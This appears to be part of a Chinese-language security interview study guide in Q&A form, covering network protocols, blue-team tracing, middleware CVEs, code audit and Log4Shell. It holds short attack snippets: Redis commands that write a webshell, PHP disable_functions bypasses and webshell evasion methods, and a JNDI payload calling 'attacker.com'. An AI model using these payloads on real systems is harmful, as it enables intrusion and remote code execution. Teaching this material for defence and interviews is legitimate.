+<p><strong>[ ] 题目</strong>：蓝队如何做攻击溯源与反制？
+<strong>答案</strong>：
+- <strong>溯源</strong>：从告警反向还原攻击链（IP→payload→样本→C2），用威胁情报扩线、关联同手法其他告警、定位攻击者画像（虚拟身份/跳板）。
+- <strong>反制</strong>：蜜罐部署诱捕、在可控样本/页面埋反制代码（如获取攻击者真实 IP/主机信息，须合法合规）、钓鱼反制。
+<strong>解析</strong>：溯源讲"证据链闭合"，反制必须在法律与授权框架内，避免变成"以攻对攻"违法。
+<strong>考察知识点</strong>：攻击链还原、威胁情报、蜜罐反制、合规边界。</p>
+<hr />
+<h1 id="_6">模块六　网络协议与安全<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h1>
+<h3 id="day-39-tcp-udp">Day 39 ｜ TCP 与 UDP 区别<a class="headerlink" href="#day-39-tcp-udp" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：TCP 和 UDP 的区别？
+<strong>答案</strong>：
+- <strong>TCP</strong>：面向连接、可靠（确认/重传/拥塞控制）、字节流、一对一、有握手，速度慢，用于 HTTP/SSH/MySQL 等。
+- <strong>UDP</strong>：无连接、不可靠（不保证到达/有序）、数据报、支持一对多、实时性高，用于 DNS/视频/游戏/QUIC。
+<strong>解析</strong>：可靠性靠开销换。TCP 保证顺序与完整，UDP 适合低延迟。面试可补：TCP 有流量/拥塞控制，UDP 没有。
+<strong>考察知识点</strong>：连接/可靠/字节流、适用场景、实时性。</p>
+<h3 id="day-40">Day 40 ｜ 三次握手 / 四次挥手<a class="headerlink" href="#day-40" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：简述 TCP 三次握手与四次挥手。
+<strong>答案</strong>：
+- <strong>握手</strong>：①SYN → ②SYN+ACK ← ③ACK →，建立连接（双方确认收发能力）。
+- <strong>挥手</strong>：①FIN → ②ACK ←（被动方可能还有数据）③FIN ← ④ACK →，关闭连接（全双工，需双向关闭）。
+<strong>解析</strong>：三次握手防止历史连接；四次挥手因 TCP 全双工，被动方收到 FIN 后可能先回 ACK 继续发数据，再发自己的 FIN。TIME_WAIT 等待 2MSL 防旧包。
+<strong>考察知识点</strong>：SYN/SYN+ACK/ACK、全双工、TIME_WAIT、2MSL。</p>
+<h3 id="day-41-tcp">Day 41 ｜ TCP 为何三次握手（不是两次）<a class="headerlink" href="#day-41-tcp" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：TCP 为什么是三次握手而不是两次？
+<strong>答案</strong>：
+- 两次握手只能确认<strong>客户端→服务端</strong>可达，无法确认<strong>服务端→客户端</strong>链路正常（服务端不知客户端能否收包）。
+- 三次握手让双方都确认彼此的收发能力，且同步初始序列号（ISN），避免历史失效连接请求造成资源浪费。
+<strong>解析</strong>：核心是确保"双向可达 + 序列号同步"。若两次，服务端过早分配资源，易被伪造 SYN 耗尽（SYN Flood 正是利用半连接）。
+<strong>考察知识点</strong>：双向确认、ISN 同步、SYN Flood、资源分配时机。</p>
+<h3 id="day-42-http">Day 42 ｜ 一次完整 HTTP 请求过程<a class="headerlink" href="#day-42-http" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：从输入 URL 到页面返回，经历了什么？
+<strong>答案</strong>：
+1. DNS 解析（域名→IP，含缓存/递归查询）；
+2. TCP 三次握手建立连接（HTTPS 还要 TLS 握手）；
+3. 客户端发 HTTP 请求（方法/路径/头/Cookie）；
+4. 服务端处理并返回响应（状态码/头/体）；
+5. 浏览器解析渲染（HTML/CSS/JS），可能再发子资源请求；
+6. TCP 四次挥手（或复用长连接）。
+<strong>解析</strong>：长连接（HTTP/1.1 Keep-Alive、HTTP/2 多路复用）省去反复握手。HTTPS 多一层 TLS 握手（见 D45）。
+<strong>考察知识点</strong>：DNS→TCP→HTTP→渲染、长连接、HTTPS 差异。</p>
+<h3 id="day-43-get-post">Day 43 ｜ GET 与 POST 区别<a class="headerlink" href="#day-43-get-post" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：GET 和 POST 有什么区别？
+<strong>答案</strong>：
+- GET 参数在 URL（可见、有长度限制、可被缓存/记录历史），用于获取；POST 在请求体（相对不可见、量大），用于提交。
+- 语义上 GET 幂等/安全（不应改服务器状态），POST 非幂等。
+- 实际都可传参、长度限制是浏览器/服务器约定而非协议硬限。
+<strong>解析</strong>：安全/幂等是 REST 语义层面的关键区别，不是"POST 更安全"（明文仍可被抓包，需 HTTPS）。URL 参数更易泄露，敏感数据用 POST+HTTPS。
+<strong>考察知识点</strong>：幂等/安全、参数位置、长度、语义约定。</p>
+<h3 id="day-44-cookie-session-httponly">Day 44 ｜ Cookie 与 Session 区别、HttpOnly<a class="headerlink" href="#day-44-cookie-session-httponly" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：Cookie 和 Session 的区别？HttpOnly 作用？
+<strong>答案</strong>：
+- <strong>Cookie</strong>：存客户端，随请求自动带，容量小（~4KB），可设过期。
+- <strong>Session</strong>：存服务端，用 SessionID（常在 Cookie）关联，安全、容量大。
+- <strong>HttpOnly</strong>：标记 Cookie 不可被 JS 读取，<code>document.cookie</code> 拿不到，缓解 XSS 盗 Cookie。
+- <strong>Secure</strong>：仅 HTTPS 传输；<strong>SameSite</strong>：防 CSRF 跨站携带。
+<strong>解析</strong>：Session 依赖 Cookie 传递 ID。HttpOnly 不能阻止 XSS 发请求，但能阻止脚本读取令牌。配合 Secure/SameSite 才完整。
+<strong>考察知识点</strong>：客户端 vs 服务端、SessionID、HttpOnly/Secure/SameSite。</p>
+<h3 id="day-45-https-http-ssltls">Day 45 ｜ HTTPS 与 HTTP 区别、SSL/TLS 握手<a class="headerlink" href="#day-45-https-http-ssltls" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：HTTPS 如何保证安全？TLS 握手过程？
+<strong>答案</strong>：
+- <strong>区别</strong>：HTTP 明文；HTTPS = HTTP over TLS，加密+身份认证+完整性。
+- <strong>握手（简化 RSA 版）</strong>：①ClientHello（支持的套件/随机数）②ServerHello+<strong>证书</strong>（含公钥）③客户端校验证书（CA 链/域名/有效期）④用公钥加密 premaster 发给服务端 ⑤双方算出对称会话密钥 ⑥加密通信。
+- 现代用 <strong>ECDHE</strong> 前向保密（临时密钥，泄露也不解密历史）。
+<strong>解析</strong>：核心三件事：证书防冒充（CA 体系）、非对称协商对称密钥（性能）、对称加密业务数据。前向保密让单次私钥泄露不影响历史会话。
+<strong>考察知识点</strong>：CA 体系、对称/非对称、ECDHE 前向保密、证书校验。</p>
+<h3 id="day-46-dns">Day 46 ｜ DNS 原理与解析过程<a class="headerlink" href="#day-46-dns" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：DNS 的作用与解析流程？
+<strong>答案</strong>：
+- <strong>作用</strong>：域名→IP 的分布式数据库（应用层，走 UDP 53，大包用 TCP）。
+- <strong>流程</strong>：浏览器缓存 → 本地 hosts → 本地 DNS（递归）→ 根 → 顶级域（.com）→ 权威 DNS → 返回 IP。
+- <strong>记录</strong>：A/AAAA、CNAME、MX、NS、TXT、PTR（反向）。
+<strong>解析</strong>：递归查询由本地 DNS 代劳，迭代查询在各级服务器间。DNS 污染/劫持可用于钓鱼与流量劫持；DNS 也是资产测绘重要入口。
+<strong>考察知识点</strong>：递归/迭代、记录类型、缓存、DNS 劫持。</p>
+<h3 id="day-47-arp-arp">Day 47 ｜ ARP 原理与 ARP 欺骗<a class="headerlink" href="#day-47-arp-arp" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：ARP 协议原理？ARP 欺骗是什么？
+<strong>答案</strong>：
+- <strong>原理</strong>：局域网内 IP→MAC 的地址解析，主机广播"谁有 IP x？"目标单播回 MAC；结果缓存于 ARP 表。
+- <strong>欺骗</strong>：攻击者在局域网伪造 ARP 应答，把自己 MAC 冒充网关/目标，实现中间人（截获/篡改流量）。
+<strong>解析</strong>：ARP 无认证，故易被欺骗。防护：静态 ARP 绑定、DAI（动态 ARP 检测）、交换机端口安全、HTTPS/802.1X。
+<strong>考察知识点</strong>：IP↔MAC、广播/单播、中间人、DAI。</p>
+<h3 id="day-48-nat">Day 48 ｜ 正向/反向代理区别、NAT<a class="headerlink" href="#day-48-nat" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：正向代理与反向代理的区别？NAT 是什么？
+<strong>答案</strong>：
+- <strong>正向代理</strong>：代表<strong>客户端</strong>访问外部（客户端配置，隐藏客户端，如科学上网/内网出网）。
+- <strong>反向代理</strong>：代表<strong>服务端</strong>接收请求（服务端部署，隐藏真实服务器，负载均衡/SSL 卸载/WAF，如 Nginx）。
+- <strong>NAT</strong>：网络地址转换，把内网私有 IP 映射为公网 IP（SNAT 出网、DNAT 端口映射），缓解 IPv4 不足并隐藏内网。
+<strong>解析</strong>：正向"帮客户出去"，反向"帮服务器收"。NAT 使内网不可直连，是内网渗透需穿透的原因（见 D27）。
+<strong>考察知识点</strong>：代理方向、负载均衡、SNAT/DNAT、内网隐藏。</p>
+<hr />
+<h1 id="_7">模块七　系统与中间件漏洞<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h1>
+<h3 id="day-49-redis">Day 49 ｜ Redis 未授权访问及利用<a class="headerlink" href="#day-49-redis" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：Redis 未授权访问有什么危害？如何利用与防御？
+<strong>答案</strong>：
+- <strong>危害</strong>：公网暴露且无密码，攻击者可读数据、写<strong>webshell</strong>（<code>config set dir /var/www</code> + <code>set xxx "&lt;?php...&gt;"</code> + <code>save</code>）、写 <strong>SSH 公钥</strong>免密登录、写 crontab 反弹 shell、主从复制 RCE（module/so）。
+- <strong>防御</strong>：<strong>设强密码</strong>（<code>requirepass</code>）、仅监听内网/127.0.0.1、改默认端口、以低权限运行、禁用危险命令（<code>FLUSHALL</code>/<code>CONFIG</code> 改名）、云安全组收紧。
+<strong>解析</strong>：Redis 是内网/公网最常见的"送 shell"服务。主从复制 RCE（CVE-2019 类）危害极大。低权限运行可阻断写文件路径。
+<strong>考察知识点</strong>：未授权、写 shell/公钥/cron、主从 RCE、requirepass。</p>
+<h3 id="day-50-mysql">Day 50 ｜ MySQL 安全（口令/写文件/提权）<a class="headerlink" href="#day-50-mysql" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：MySQL 相关的安全点有哪些？
+<strong>答案</strong>：
+- 口令弱/空密码、默认端口暴露；口令存于 <code>mysql.user</code>，<code>authentication_string</code> 为加密值。
+- <strong>写文件</strong>：<code>into outfile</code> 受 <code>secure_file_priv</code> 与 File 权限限制（Day 2）。
+- <strong>提权</strong>：UDF 提权（写 .so/.dll 并 <code>create function</code>）、MOF 提权（Win）、<code>mysql_log</code> 写文件。
+- <strong>防御</strong>：强口令、最小权限、限制远程、关闭文件导出、升级版本。
+<strong>解析</strong>：UDF 提权需能写插件目录且具 File 权限，老版本常见。现代 MySQL 默认 secure_file_priv 限制使写文件提权变难。
+<strong>考察知识点</strong>：secure_file_priv、UDF/MOF 提权、口令存储、最小权限。</p>
+<h3 id="day-51-tomcat-weblogic">Day 51 ｜ Tomcat / Weblogic 等中间件漏洞<a class="headerlink" href="#day-51-tomcat-weblogic" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：常见中间件/框架漏洞有哪些？
+<strong>答案</strong>：
+- <strong>Tomcat</strong>：PUT 上传（CVE-2017-12615，默认关）、弱口令 + 后台部署 war 包 getshell、AJP 文件读取（CVE-2020-1938）。
+- <strong>Weblogic</strong>：反序列化多条（XMLDecoder、T3/IIOP 反序列化 RCE）、后台部署。
+- <strong>Struts2</strong>：OGNL 表达式注入（S2-系列 RCE）。
+- <strong>Log4j</strong>：JNDI 注入（CVE-2021-44228，Log4Shell），<code>${jndi:ldap://}</code> 远程加载。
+- <strong>FastJson/Shiro</strong>：反序列化（见 Day 11）。
+<strong>解析</strong>：中间件/框架历史洞是外网突破口首选。Log4Shell 因广泛依赖影响巨大，核心是 JNDI 远程加载可控。
+<strong>考察知识点</strong>：war 部署、反序列化链、Log4Shell、AJP。</p>
+<h3 id="day-52-linux-windows">Day 52 ｜ Linux / Windows 安全加固要点<a class="headerlink" href="#day-52-linux-windows" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：系统安全加固一般做什么？
+<strong>答案</strong>：
+- <strong>Linux</strong>：停用不必要的服务/端口、SSH 禁 root 登录+密钥登录+改端口、防火墙（iptables/nftables）、文件权限最小化、定期补丁、审计（auditd）、日志集中。
+- <strong>Windows</strong>：关不必要的服务/共享、组策略加固、账户口令策略、UAC、补丁、EDR、限制管理员。
+<strong>解析</strong>：加固=最小化攻击面 + 纵深防御 + 可观测。靶机/生产都要"默认拒绝、按需开放"。
+<strong>考察知识点</strong>：最小权限、SSH 加固、补丁、组策略、EDR。</p>
+<h3 id="day-53">Day 53 ｜ 常见端口与服务对应<a class="headerlink" href="#day-53" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：列举常见端口及对应服务。
+<strong>答案</strong>：
+- 21 FTP、22 SSH、23 Telnet、25 SMTP、53 DNS、80 HTTP、443 HTTPS、110 POP3、135/139/445 SMB、1433 MSSQL、1521 Oracle、3306 MySQL、3389 RDP、5432 PostgreSQL、6379 Redis、8080 Tomcat、9000/9200 等。
+<strong>解析</strong>：端口是资产测绘与服务识别的基础。445（SMB）是 EternalBlue 入口，3389（RDP）易被爆破，6379/3306 未授权/弱口令是常见突破口。
+<strong>考察知识点</strong>：端口-服务映射、SMB/RDP/Redis、资产识别。</p>
+<hr />
+<h1 id="_8">模块八　安全基础·等保·法律法规·加密<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h1>
+<h3 id="day-54-20">Day 54 ｜ 等保 2.0 级别与要求<a class="headerlink" href="#day-54-20" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：信息安全等级保护（等保 2.0）分几级？基本要求？
+<strong>答案</strong>：
+- <strong>五级</strong>：第一级（自主保护）、第二级（指导保护）、第三级（监督保护）、第四级（强制保护）、第五级（专控保护）。
+- <strong>2.0 扩展</strong>：覆盖云计算/移动互联/物联网/工业控制/大数据；基本要求含<strong>安全技术</strong>（物理/网络/主机/应用/数据）与管理（制度/机构/人员/建设/运维）两大体系。
+<strong>解析</strong>：一般重要系统定级二级或三级，三级需每年测评。2.0 从"单系统"走向"多云多场景"，强调"一个中心、三重防护"。
+<strong>考察知识点</strong>：五级定义、2.0 扩展、技术+管理、三级测评。</p>
+<h3 id="day-55">Day 55 ｜ 网络安全法 / 数据安全法要点<a class="headerlink" href="#day-55" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：《网络安全法》与《数据安全法》的核心要求？
+<strong>答案</strong>：
+- <strong>网安法</strong>：网络运营者落实等级保护、实名、日志留存≥6 个月、个人信息保护、关键信息基础设施重点保护；明确攻击/入侵/干扰网络的违法责任。
+- <strong>数据安全法</strong>：数据分类分级、重要数据保护、数据出境安全管理、数据处理活动的安全义务。
+- 还有《个人信息保护法》《密码法》构成合规体系。
+<strong>解析</strong>：合规是安全底线。渗透测试须有授权，触碰上述红线即违法。面试答"遵守授权与法规、不越界"。
+<strong>考察知识点</strong>：等保义务、日志留存、数据分级、授权合法。</p>
+<h3 id="day-56">Day 56 ｜ 对称/非对称加密、哈希、数字签名<a class="headerlink" href="#day-56" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：对称加密、非对称加密、哈希、数字签名分别是什么？
+<strong>答案</strong>：
+- <strong>对称加密</strong>：同密钥加解密（AES/DES/3DES），快，但密钥分发难。
+- <strong>非对称</strong>：公私钥对（RSA/ECC），公钥加密私钥解、私钥签名公钥验；慢，用于密钥协商/签名。
+- <strong>哈希</strong>：单向摘要（MD5/SHA），不可逆、定长，用于完整性校验（如密码加盐存储）。
+- <strong>数字签名</strong>：私钥对摘要加密，公钥验证，保证<strong>不可否认+完整性+来源</strong>。
+<strong>解析</strong>：混合加密（AES 传数据 + RSA 传密钥）兼顾效率与安全。MD5/SHA1 已不推荐用于安全场景（碰撞），密码用 bcrypt/argon2 加盐。
+<strong>考察知识点</strong>：对称 vs 非对称、哈希不可逆、签名、混合加密。</p>
+<h3 id="day-57-ids-ips-waf">Day 57 ｜ IDS / IPS / WAF / 防火墙区别<a class="headerlink" href="#day-57-ids-ips-waf" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：IDS、IPS、WAF、防火墙各自职责？
+<strong>答案</strong>：
+- <strong>防火墙</strong>：基于规则控制网络访问（包过滤/状态检测/应用网关），工作在网络层/应用层，主要"防越界"。
+- <strong>IDS</strong>：入侵<strong>检测</strong>（旁路监听、告警，不阻断）。
+- <strong>IPS</strong>：入侵<strong>防御</strong>（串行部署、可阻断）。
+- <strong>WAF</strong>：Web 应用防火墙，针对 HTTP/HTTPS 应用层攻击（SQLi/XSS/上传等）过滤。
+<strong>解析</strong>：防火墙管"网络通断"，WAF 管"Web 请求内容"，IDS/IPS 管"入侵行为"。WAF 在应用层、IDS/IPS 在网络层更广泛。
+<strong>考察知识点</strong>：检测 vs 阻断、网络层 vs 应用层、WAF 定位。</p>
+<h3 id="day-58">Day 58 ｜ 蜜罐技术<a class="headerlink" href="#day-58" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：什么是蜜罐？有什么作用？
+<strong>答案</strong>：
+- <strong>定义</strong>：布置诱饵主机/服务/漏洞，主动吸引攻击者，用于<strong>检测、预警、溯源、研究</strong>攻击手法。
+- <strong>类型</strong>：低交互（模拟服务，安全）/高交互（真实系统，信息多但风险高）；网络蜜罐/主机蜜罐/蜜网。
+- <strong>作用</strong>：提前发现探测、拖延攻击、采集样本、辅助溯源反制（见 D38）。
+<strong>解析</strong>：蜜罐是主动防御。高交互蜜罐需隔离，避免被用作跳板。护网中蜜罐/蜜饵常用于反制与溯源。
+<strong>考察知识点</strong>：诱捕、低/高交互、检测与溯源、隔离风险。</p>
+<hr />
+<h1 id="_9">模块九　代码审计与开发安全<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h1>
+<h3 id="day-59-owasp-top-10-2017-2021">Day 59 ｜ ★★★★★ OWASP Top 10 2017 与 2021 对比<a class="headerlink" href="#day-59-owasp-top-10-2017-2021" title="Permanent link">&para;</a></h3>
+<p><strong>题目</strong>：OWASP Top 10 2017 与 2021 的主要差异？新增/合并了哪些类别？
+<strong>答案</strong>：
+- <strong>2017 版</strong>：A1 注入、A2 失效身份认证、A3 敏感数据泄露、A4 XXE、A5 失效访问控制、A6 安全配置错误、A7 XSS、A8 不安全反序列化、A9 已知漏洞组件、A10 日志不足。
+- <strong>2021 版</strong>：A01 访问控制失效（合并）、A02 加密机制失效（合并）、A03 注入（合并 SQL/NoSQL/XXE/命令）、A04 <strong>不安全设计（新增）</strong>、A05 安全配置错误（前移）、A06 缺陷/过时组件、A07 身份认证失效、A08 <strong>软件和数据完整性失效（新增，含反序列化/CI/CD 供应链）</strong>、A09 日志监控失效（改名）、A10 <strong>服务端请求伪造 SSRF（新增独立）</strong>。
+- <strong>关键新增</strong>：A04 不安全设计（强调威胁建模与架构安全）、A08 完整性失效（SolarWinds/Codecov 供应链）、A10 SSRF 独立（云时代内网访问风险）。
+- <strong>关键合并</strong>：敏感数据泄露并入加密失效类；XSS 并入注入类作为子项。
+<strong>解析</strong>：考察 Web 安全全景认识与行业趋势。易错点：把 2017 的 A1 注入直接对应 2021 的 A03（实际范围已扩大）。面试官想听到：能讲清 SSRF 为何独立成类（云元数据访问风险加剧）、理解"不安全设计"是新增的理念类（覆盖整个 SDLC 而非具体漏洞）、知道 A08 与供应链攻击的关联。
+<strong>考察知识点</strong>：2017 → 2021 合并/新增/重命名、A04 不安全设计、A08 完整性失效、A10 SSRF 独立、注入类范围扩大。<strong>→ 详见《面试精华宝典》精讲第 9 题</strong>。</p>
+<h3 id="day-60">Day 60 ｜ ★★★★ 代码审计主要方法与常见漏洞<a class="headerlink" href="#day-60" title="Permanent link">&para;</a></h3>
+<p><strong>题目</strong>：代码审计的主要方法论是什么？常见漏洞类型有哪些？
+<strong>答案</strong>：
+- <strong>方法论</strong>：
+  1. <strong>自上而下（Top-Down）</strong>：从入口点（Controller/Servlet/路由）追踪到危险函数（SQL 执行、文件操作、命令执行）。
+  2. <strong>自下而上（Bottom-Up）</strong>：从危险函数（<code>eval</code>、<code>system</code>、<code>Statement.execute</code>）反向追踪调用链。
+  3. <strong>横向审计</strong>：按功能模块（认证/支付/文件上传）逐个审计。
+  4. <strong>数据流审计（污点追踪）</strong>：跟踪用户输入从入口到危险函数的完整路径。
+- <strong>常见漏洞</strong>：
+  - <strong>注入</strong>：SQL / NoSQL / 命令 / 表达式（SpEL/OGNL/EL/JEXL）。
+  - <strong>反序列化</strong>：Java <code>ObjectInputStream</code> / PHP <code>unserialize</code> / Python <code>pickle</code> / Node <code>node-serialize</code>。
+  - <strong>文件操作</strong>：任意文件读写、路径遍历、文件上传漏洞。
+  - <strong>身份认证</strong>：硬编码凭证、会话固定、弱加密算法、密码明文存储。
+  - <strong>权限</strong>：越权访问、IDOR、缺失权限校验。
+  - <strong>Web 标准</strong>：XXE / XSS / CSRF / SSRF。
+  - <strong>加密</strong>：硬编码密钥、弱算法（MD5/SHA1）、不安全随机数。
+  - <strong>日志</strong>：敏感信息泄露、缺失审计。
+- <strong>工具链</strong>：Fortify / Checkmarx（商业）、Semgrep / CodeQL / SonarQube（开源）。
+<strong>解析</strong>：考察代码审计能力（实习→高级进阶）。易错点：只说工具不说方法论。面试官想听到：能区分自上而下 vs 自下而上、知道污点追踪是核心思路、明白不同语言的危险函数差异。
+<strong>考察知识点</strong>：Top-Down vs Bottom-Up、污点追踪（Taint Analysis）、跨语言危险函数、工具链分层。<strong>→ 详见《面试精华宝典》精讲第 33 题</strong>。</p>
+<h3 id="day-61">Day 61 ｜ ★★★ 代码审计的流程、方法与工具链<a class="headerlink" href="#day-61" title="Permanent link">&para;</a></h3>
+<p><strong>题目</strong>：代码审计的项目流程是什么？有哪些实用工具？
+<strong>答案</strong>：
+- <strong>流程</strong>：
+  1. <strong>前期准备</strong>：获取代码仓库、确认审计范围、搭建运行环境（含调试器）。
+  2. <strong>熟悉架构</strong>：了解技术栈（Spring/Django/Laravel/Express）、识别入口点（路由、Controller、中间件）。
+  3. <strong>工具扫描</strong>：先用自动化工具（Semgrep/CodeQL）跑一遍，输出候选漏洞清单。
+  4. <strong>人工复核</strong>：对工具结果去重、验证可达性、利用条件、危害。
+  5. <strong>深度挖掘</strong>：对核心业务做横向+纵向审计（污点追踪+危险函数）。
+  6. <strong>漏洞报告</strong>：按"漏洞描述 + 复现步骤 + 危害评估 + 修复建议"四段式输出。
+  7. <strong>复测</strong>：修复后回归测试，确认漏洞已闭合。
+- <strong>方法</strong>：
+  - <strong>关键字搜索</strong>：<code>eval</code> / <code>exec</code> / <code>system</code> / <code>Statement</code> / <code>request.getParameter</code> / <code>pickle.loads</code>。
+  - <strong>正则模式</strong>：弱哈希（<code>md5(</code>、<code>sha1(</code>）、硬编码密钥（<code>api_key =</code>、<code>password =</code>）。
+  - <strong>数据流追踪</strong>：污点分析（用户输入 → 危险函数）。
+  - <strong>调用图</strong>：通过 IDE 插件（如 IntelliJ Code Vision）看调用链。
+- <strong>工具</strong>：
+  - <strong>商业</strong>：Fortify SCA、Checkmarx、Veracode（贵但全面）。
+  - <strong>开源/免费</strong>：Semgrep（轻量规则）、CodeQL（GitHub）、SonarQube（持续集成）。
+  - <strong>IDE 插件</strong>：JetBrains Security（实时检查）、Cobra（白盒扫描）。
+  - <strong>专项</strong>：PHP CodeSniffer、Bandit（Python）、Brakeman（Ruby on Rails）、gosec（Go）。
+<strong>解析</strong>：考察项目落地能力。易错点：直接用工具扫描就完事（缺少人工复核）。面试官想听到：能讲清工具结果去重与可达性验证、明白不同语言工具差异（Bandit/Brakeman/Semgrep）。
+<strong>考察知识点</strong>：审计 7 步流程、关键字+正则+数据流+调用图四类方法、工具分层（商业/开源/IDE/专项）、漏洞报告四段式。<strong>→ 详见《面试精华宝典》精讲第 44 题</strong>。</p>
+<h3 id="day-62-php-disable_functions">Day 62 ｜ ★★★★ PHP 危险函数与 disable_functions 绕过<a class="headerlink" href="#day-62-php-disable_functions" title="Permanent link">&para;</a></h3>
+<p><strong>题目</strong>：PHP 中哪些函数最危险？disable_functions 如何绕过？
+<strong>答案</strong>：
+- <strong>PHP 命令执行</strong>：system、exec、shell_exec（反引号）、passthru、popen、proc_open、pcntl_exec。
+- <strong>PHP 代码执行</strong>：eval、assert、preg_replace（/e 已废弃）、create_function（已废弃）、call_user_func、array_map（回调可控）。
+- <strong>disable_functions 绕过</strong>：
+  1. <strong>LD_PRELOAD 劫持</strong>：<code>putenv()</code> + <code>mail()</code> 触发新进程加载恶意 .so（最常用，PHP 5.x-8.x 通杀）。
+  2. <strong>FFI 扩展</strong>（PHP 7.4+）：<code>ffi.cdef</code> 调用 C 函数执行系统命令。
+  3. <strong>ImageMagick 命令执行</strong>（CVE-2016-3714）：图片处理时执行命令。
+  4. <strong>Bash 破壳漏洞</strong>（CVE-2014-6271）：环境变量注入。
+  5. <strong>PHP 7.0-7.3 gc 回收</strong>：<code>json_encode</code> 触发 UAF。
+  6. <strong>chankro</strong>：Python 工具自动生成 .so + putenv + mail。
+  7. <strong>Apache mod_cgi</strong>：<code>.htaccess</code> + 图片马 + CGI。
+- <strong>WebShell 免杀</strong>：base64+str_rot13+gzinflate 多层编码、可变函数拼接、回调函数、OPcache 缓存、Java 内存马。
+- <strong>防御组合</strong>：<code>disable_functions</code> + <code>open_basedir</code> + <code>putenv</code>/<code>mail</code> 禁用 + WAF + RASP。
+<strong>解析</strong>：考察 PHP 安全细节。易错点：以为 <code>disable_functions</code> 禁用就安全。面试官想听到：能列 LD_PRELOAD / FFI / chankro 等现代绕过方案、明白免杀方向（编码/回调/内存马）。
+<strong>考察知识点</strong>：PHP 命令/代码执行函数分类、disable_functions 主流绕过（LD_PRELOAD/FFI/chankro）、WebShell 免杀方向、纵深防御组合。<strong>→ 详见《面试精华宝典》精讲第 28 题</strong>。</p>
+<hr />
+<h1 id="_10">============================================================<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h1>
+<h1 id="_11">模块十　中间件与组件漏洞<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h1>
+<h3 id="day-63-tomcat-jboss-weblogic">Day 63 ｜ ★★★★★ Tomcat / JBoss / WebLogic 中间件漏洞<a class="headerlink" href="#day-63-tomcat-jboss-weblogic" title="Permanent link">&para;</a></h3>
+<p><strong>题目</strong>：常见 Java 中间件高危漏洞有哪些？
+<strong>答案</strong>：
+- <strong>Tomcat</strong>：
+  - PUT 上传（CVE-2017-12615）：<code>readonly=false</code> 时支持 PUT，部署 war。
+  - AJP 文件读取（CVE-2020-1938，GhostCat）：8009 端口 AJP 协议读任意文件。
+  - 弱口令 + 后台部署 war：<code>/manager/html</code> 默认 admin/admin。
+  - 反序列化（Apache Commons Collections gadget）。
+- <strong>WebLogic</strong>：
+  - XMLDecoder 反序列化（CVE-2017-10271）：<code>/wls-wsat/CoordinatorPortType</code>。
+  - T3/IIOP 反序列化：7001 端口多个 gadget（CC/CB）。
+  - 后台弱口令 + 部署 war。
+- <strong>JBoss</strong>：
+  - JMXInvokerServlet / HttpInvoker 反序列化（CVE-2015-7501）。
+  - <code>/admin-console</code> 默认 admin/admin。
+  - war 部署（默认可写）。
+- <strong>GlassFish</strong>：admin 后台默认 admin/admin（无口令）。
+- <strong>Apache</strong>：解析漏洞（多后缀）、mod_cgi 绕过、Range 头 DoS。
+- <strong>Nginx</strong>：解析漏洞（CVE-2013-4547 空字节）、目录穿越、alias 错误配置。
+<strong>解析</strong>：考察外网突破首选面。易错点：只说 Tomcat 弱口令。面试官想听到：能列具体 CVE 编号、知道 WebLogic 反序列化链最丰富、理解 AJP/T3 等特殊端口协议。
+<strong>考察知识点</strong>：Tomcat CVE-2017-12615/2020-1938、WebLogic XMLDecoder + T3、JBoss HttpInvoker、GlassFish 默认无口令、war 部署+弱口令组合。<strong>→ 详见《面试精华宝典》精讲第 11 题</strong>。</p>
+<h3 id="day-64-log4j2-jndi-cve-2021-44228log4shell">Day 64 ｜ ★★★★★ Log4j2 JNDI 注入漏洞（CVE-2021-44228，Log4Shell）<a class="headerlink" href="#day-64-log4j2-jndi-cve-2021-44228log4shell" title="Permanent link">&para;</a></h3>
+<p><strong>题目</strong>：Log4Shell 漏洞原理、影响与修复？
+<strong>答案</strong>：
+- <strong>原理</strong>：Log4j2 的 <code>lookup()</code> 函数支持 JNDI 远程加载，当日志内容含 <code>${jndi:ldap://attacker.com/exp}</code> 时触发 JNDI 查询，下载并执行恶意 Java 类 → RCE。
+- <strong>影响范围</strong>：Log4j 2.x ≤ 2.14.1，全球数百万应用（Apache Struts2、Solr、ElasticSearch、Minecraft 等）。
+- <strong>漏洞特征</strong>：payload 形如 <code>${jndi:ldap://x.x.x.x:1389/a}</code>、<code>${jndi:dns://x.x.x.x}</code>。
+- <strong>绕过</strong>：2.15.0 修补不彻底（CVE-2021-45046 绕过），2.16.0 默认禁用递归查找但仍可触发，2.17.0 仍存在 CVE-2021-45105 DoS。
+- <strong>修复</strong>：
+  1. 升级到 <strong>Log4j 2.17.1+</strong>（彻底禁用 JNDI Lookup）。
+  2. 临时缓解：JVM 参数 <code>-Dlog4j2.formatMsgNoLookups=true</code>。
+  3. 移除 classpath 中 <code>JndiLookup.class</code>。
+  4. WAF 拦截 <code>${jndi:</code> 关键字。
+- <strong>检测</strong>：<code>grep -r "log4j-core"</code> 找依赖、运行时检测 JNDI 调用。
